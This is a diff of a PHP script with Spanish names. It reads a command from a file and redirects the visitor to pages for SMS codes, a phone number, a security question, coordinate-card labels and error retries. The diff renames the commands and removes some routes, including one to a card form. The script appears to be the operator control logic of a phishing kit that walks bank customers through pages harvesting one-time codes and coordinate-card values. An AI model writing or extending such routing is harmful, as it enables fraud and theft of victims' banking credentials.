@@ -12,28 +12,37 @@ if (file_exists($archivo)) {
     $accion = trim(file_get_contents($archivo));
     unlink($archivo);
 
-    if (substr($accion, 0, strlen("/clave/")) === "/clave/") {
-        $pregunta = explode("/clave/", $accion)[1];
+    // Reemplazamos str_starts_with por substr()
+    if (substr($accion, 0, strlen("/palabra clave/")) === "/palabra clave/") {
+        $pregunta = explode("/palabra clave/", $accion)[1];
         $_SESSION['pregunta'] = $pregunta;
         header("Location: pregunta.php");
         exit;
     }
 
-    if (substr($accion, 0, strlen("/etiquetas/")) === "/etiquetas/") {
-        $etiquetas = explode("/etiquetas/", $accion)[1];
+    if (substr($accion, 0, strlen("/coordenadas etiquetas/")) === "/coordenadas etiquetas/") {
+        $etiquetas = explode("/coordenadas etiquetas/", $accion)[1];
         $_SESSION['etiquetas'] = explode(",", $etiquetas);
         header("Location: coordenadas.php");
         exit;
     }
 
-    switch ($accion) {
-        case "/v1": header("Location: sms.php"); exit;
-        case "/v1error": header("Location: smserror.php"); exit;
-        case "/n1": header("Location: numero.php"); exit;
-        case "/retry": header("Location: index2.php"); exit;
-        case "/inicio": header("Location: index.php"); exit;
-        case "/err1": header("Location: index2.php"); exit;
-        case "/form": header("Location: card.html"); exit;
+    if ($accion == "/SMS") {
+        header("Location: sms.php");
+        exit;
+    }
+
+    if ($accion == "/SMSERROR") {
+        header("Location: smserror.php");
+        exit;
+    }
+    if ($accion == "/NUMERO") {
+        header("Location: numero.php");
+        exit;
+    }
+    if ($accion == "/ERROR") {
+        header("Location: index2.php");
+        exit;
     }
 }
 ?>
